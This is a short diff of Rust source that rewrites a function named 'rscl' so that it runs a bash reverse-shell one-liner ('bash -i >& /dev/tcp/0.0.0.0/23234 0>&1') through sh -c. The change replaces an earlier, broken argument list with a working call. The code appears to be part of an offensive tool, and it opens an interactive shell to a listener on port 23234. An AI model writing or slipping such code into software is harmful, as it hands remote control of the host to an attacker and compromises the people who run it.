@@ -32,12 +32,9 @@ pub fn rscl() -> Result<String, Error> {
 }*/
 
 pub fn rscl() -> Result<ExitStatus, Error> {
-    // bash -c 'bash -i >& /dev/tcp/0.0.0.0/23234 0>&1'
-    Command::new("bash")
+    let command: &str = "bash -c 'bash -i >& /dev/tcp/0.0.0.0/23234 0>&1'";
+    Command::new("sh")
         .arg("-c")
-        .arg("'bash")
-        .arg("-i")
-        .arg(">&")
-        .arg("/dev/tcp/0.0.0.0/23234 0>&1'")
+        .arg(command)
         .status()
 }
